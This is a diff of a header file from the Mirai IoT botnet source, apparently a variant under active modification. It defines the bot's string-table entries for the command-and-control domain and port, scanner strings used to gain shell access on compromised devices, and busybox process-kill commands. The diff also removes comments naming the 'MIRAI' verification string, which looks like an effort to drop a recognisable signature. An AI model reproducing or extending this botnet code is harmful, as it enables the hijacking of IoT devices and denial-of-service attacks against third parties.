@@ -14,7 +14,7 @@ struct table_value {
 /* Generic bot info */
 #define TABLE_PROCESS_ARGV              1
 #define TABLE_EXEC_SUCCESS              2
-#define TABLE_CNC_IP                    3
+#define TABLE_CNC_DOMAIN                3
 #define TABLE_CNC_PORT                  4
           
 /* Killer data */          
@@ -39,8 +39,8 @@ struct table_value {
 #define TABLE_SCAN_ENABLE               21  /* 'enable' to enable shell access */
 #define TABLE_SCAN_SYSTEM               22  /* 'system' to enable shell access */
 #define TABLE_SCAN_SH                   23  /* 'sh' to enable shell access */
-#define TABLE_SCAN_QUERY                24  /* '﻿/bin/busybox MIRAI' echo hex string to verify login */
-#define TABLE_SCAN_RESP                 25  /* '﻿MIRAI: applet not found' utf8 version of query string */
+#define TABLE_SCAN_QUERY                24  /* echo hex string to verify login */
+#define TABLE_SCAN_RESP                 25  /* utf8 version of query string */
 #define TABLE_SCAN_NCORRECT             26  /* 'ncorrect' to fast-check for invalid password */
 #define TABLE_SCAN_PS                   27  /* "/bin/busybox ps" */
 #define TABLE_SCAN_KILL_9               28  /* "/bin/busybox kill -9 " */
